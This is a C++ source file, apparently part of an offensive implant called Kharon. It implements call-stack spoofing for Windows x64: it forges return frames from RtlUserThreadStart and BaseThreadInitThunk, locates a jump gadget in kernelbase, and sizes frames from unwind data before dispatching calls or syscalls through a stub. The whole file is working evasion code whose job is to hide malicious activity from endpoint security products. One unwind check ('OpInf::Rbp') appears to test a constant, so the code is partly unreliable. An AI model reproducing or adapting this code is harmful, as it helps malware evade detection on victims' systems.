#include <Kharon.h>

EXTERN_C UPTR SpoofCall( ... );

auto DECLFN Spoof::Call(
    _In_ UPTR Fnc, 
    _In_ UPTR Ssn, 
    _In_ UPTR Arg1,
    _In_ UPTR Arg2,
    _In_ UPTR Arg3,
    _In_ UPTR Arg4,
    _In_ UPTR Arg5,
    _In_ UPTR Arg6,
    _In_ UPTR Arg7,
    _In_ UPTR Arg8,
    _In_ UPTR Arg9,
    _In_ UPTR Arg10,
    _In_ UPTR Arg11,
    _In_ UPTR Arg12
) -> UPTR {
/* ========= [ calculate stack for spoof ] ========= */
    Self->Spf->Setup.First.Ptr  = (UPTR)Self->Ntdll.RtlUserThreadStart+0x21;
    Self->Spf->Setup.Second.Ptr = (UPTR)Self->Krnl32.BaseThreadInitThunk+0x14;

    Self->Spf->Setup.First.Size  = Self->Spf->StackSizeWrapper( Self->Spf->Setup.First.Ptr );
    Self->Spf->Setup.Second.Size = Self->Spf->StackSizeWrapper( Self->Spf->Setup.Second.Ptr );

    do {
        this->Setup.Gadget.Ptr  = Self->Usf->FindGadget( Self->KrnlBase.Handle, 0x23 );
        this->Setup.Gadget.Size = (UPTR)this->StackSizeWrapper( this->Setup.Gadget.Ptr );
    } while ( ! this->Setup.Gadget.Size );

    this->Setup.Ssn      = Ssn;
    this->Setup.ArgCount = 8;

    return SpoofCall( Arg1, Arg2, Arg3, Arg4, Fnc, (UPTR)&this->Setup, Arg5, Arg6, Arg7, Arg8, Arg9, Arg10, Arg11, Arg12 );
}

auto DECLFN Spoof::StackSizeWrapper(
    _In_ UPTR RetAddress
) -> UPTR {
    LONG Status  = STATUS_SUCCESS;
    UPTR ImgBase = 0;

    RUNTIME_FUNCTION*     RtmFunction = { nullptr };
    UNWIND_HISTORY_TABLE* HistoryTbl  = { nullptr };

    if ( ! RetAddress ) {
        return (UPTR)nullptr;
    }

    RtmFunction = Self->Ntdll.RtlLookupFunctionEntry( 
        (UPTR)RetAddress, &ImgBase, HistoryTbl 
    );
    if ( ! RtmFunction ) {
        return (UPTR)nullptr;
    }

    return StackSize( (UPTR)RtmFunction, ImgBase );
}

auto DECLFN Spoof::StackSize(
    _In_ UPTR RtmFunction,
    _In_ UPTR ImgBase
) -> UPTR {
    STACK_FRAME  Stack   = { 0 };
    UNWIND_INFO* UwInfo  = (UNWIND_INFO*)( reinterpret_cast<RUNTIME_FUNCTION*>( RtmFunction )->UnwindData + ImgBase );
    UNWIND_CODE* UwCode  = UwInfo->UnwindCode;
    REG_CTX      Context = { 0 };

    ULONG FrameOffset = 0;
    ULONG Total       = 0;
    ULONG Index       = 0;
    UBYTE UnwOp       = 0;
    UBYTE OpInfo      = 0;
    ULONG CodeCount   = UwInfo->CountOfCodes;

    while ( Index < CodeCount ) {
        UnwOp  = UwInfo->UnwindCode[Index].UnwindOp;
        OpInfo = UwInfo->UnwindCode[Index].OpInfo;

        switch ( UnwOp ) {
            case UWOP_PUSH_NONVOL: {
                Stack.TotalSize += 8;
                if ( OpInf::Rbp ) {
                    Stack.PushRbp      = TRUE;
                    Stack.CountOfCodes = CodeCount;
                    Stack.PushRbpIdx   = Index + 1;
                }
                break;
            }
            case UWOP_ALLOC_LARGE: {
                Index++;
                FrameOffset = UwCode[Index].FrameOffset;

                if ( OpInfo == 0 ) {
                    FrameOffset *= 8; 
                } else if ( OpInfo == 1 ) {
                    Index++;
                    FrameOffset += UwCode[Index].FrameOffset << 16;
                }

                Stack.TotalSize += FrameOffset; break;
            }
            case UWOP_ALLOC_SMALL: {
                ULONG size = ( ( OpInfo * 8 ) + 8 );
                Stack.TotalSize += size; break;
            }
            case UWOP_SET_FPREG: {
                Stack.SetsFramePtr = TRUE; 
                break;
            }
            case UWOP_SAVE_NONVOL: {
                Index += 1; 
                break;
            }
            default:
                break; 
        }

        Index += 1;
    }

    if ( UwInfo->Flags & UNW_FLAG_CHAININFO ) {
        Index = UwInfo->CountOfCodes;
        if ( Index & 1 ) Index += 1;

        RtmFunction = (UPTR)( reinterpret_cast<RUNTIME_FUNCTION*>( &UwInfo->UnwindCode[Index] ) );
        return this->StackSize( RtmFunction, ImgBase );
    }
    
    Stack.TotalSize += 8;

    return (UPTR)Stack.TotalSize;
}